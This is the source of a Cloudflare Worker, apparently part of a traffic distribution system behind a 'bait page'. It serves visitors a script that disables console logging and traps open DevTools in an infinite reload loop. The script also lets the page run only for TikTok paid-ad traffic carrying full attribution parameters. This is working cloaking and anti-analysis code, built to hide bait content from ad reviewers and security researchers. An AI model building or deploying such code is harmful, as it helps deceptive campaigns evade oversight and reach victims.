// §5 — corrected role: this lane does NOT mint a session (that's native-app
// territory now, see docs/build-spec.md §5's correction). Its one
// solidly-evidenced job is a referrer/medium sanity check. Treat it as
// optional defense-in-depth — you could fold this into §6 (lane-3-classify)
// and drop this lane entirely; it exists as its own Worker mainly for the
// ops reasons in §11 (independent kill/rotation), not because the logic
// needs its own stage.

import { corsHeaders, handleOptions } from '../../shared/cors.mjs';

function buildDeliveredScript() {
  return `
(function() {
  // Silence console
  var _noop = function(){};
  var _con = window.console || {};
  ['log','warn','info','error','trace','table','exception'].forEach(function(m) {
    try { _con[m] = _noop; } catch(e) {}
  });
  try { window.console = _con; } catch(e) {}

  // Debugger trap — long gap = DevTools open → reload
  setInterval(function() {
    try {
      var _s = performance.now();
      debugger;
      if (performance.now() - _s > 100) { while (true) { location.reload(); } }
    } catch(e) {}
  }, 2000);

  // Traffic gate: must be TikTok paid with full attribution
  var _src  = (typeof utm_source   !== 'undefined' ? utm_source   : '').toLowerCase();
  var _med  = (typeof utm_medium   !== 'undefined' ? utm_medium   : '').toLowerCase();
  var _clid = typeof ttclid        !== 'undefined' ? ttclid        : '';
  var _uid  = typeof utm_id        !== 'undefined' ? utm_id        : '';
  var _camp = typeof utm_campaign  !== 'undefined' ? utm_campaign  : '';

  if (_src !== 'tiktok' || _med !== 'paid' || !_clid || !_uid || !_camp) {
    window.__tdsAbort = true;
  }
})();
`.trim();
}

export default {
  async fetch(request, env) {
    const allowedOrigin = env.ALLOWED_ORIGIN || 'https://REPLACE-bait-page.pages.dev';

    if (request.method === 'OPTIONS') return handleOptions(request, allowedOrigin);
    if (request.method !== 'POST') return new Response('Method not allowed', { status: 405 });

    const body = await request.json().catch(() => ({}));
    env.TDS_ANALYTICS?.writeDataPoint({
      indexes: [body._sessionRef || ''],
      blobs: ['lane-2-arrived'],
      doubles: [Date.now()],
    });

    const code = buildDeliveredScript();
    return new Response(code, {
      status: 200,
      headers: { ...corsHeaders(request, allowedOrigin), 'Content-Type': 'application/javascript' },
    });
  },
};
